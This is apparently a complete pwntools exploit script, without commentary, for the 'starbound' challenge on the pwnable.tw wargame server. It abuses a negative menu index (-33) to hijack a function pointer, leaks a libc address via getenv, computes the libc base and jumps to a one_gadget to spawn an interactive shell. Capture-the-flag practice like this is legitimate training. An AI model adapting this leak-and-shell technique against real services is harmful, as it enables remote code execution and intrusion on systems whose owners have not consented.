from pwn import *
# conn=process("./starbound")
conn=remote("chall.pwnable.tw",10202)
libc=ELF("libc.so.6")

context.log_level="debug"
def changeName(name):
	conn.sendlineafter("> ","6")
	conn.sendlineafter("> ","2")
	conn.sendlineafter("Enter your name: ",name)
	conn.sendlineafter("> ","1")

# leak libc address
changeName(p32(0x08049C16))
f={
	0:"-33\n",
	8:p32(0x0804A664),
}
payload=fit(f,length=0x78,filler="a")
conn.sendafter("> ",payload)
conn.recvuntil(payload)
getenv_address=u32(conn.recv(4))-0x1c
libc_address=getenv_address-libc.symbols["getenv"]
log.debug("libc address is 0x%x"%libc_address)

# execute one_gadget
changeName(p32(libc_address+0x3ac5e))
payload=fit(f,length=0x50,filler="\x00")
conn.sendafter("> ",payload)
conn.sendafter("> ","-33")
conn.interactive()
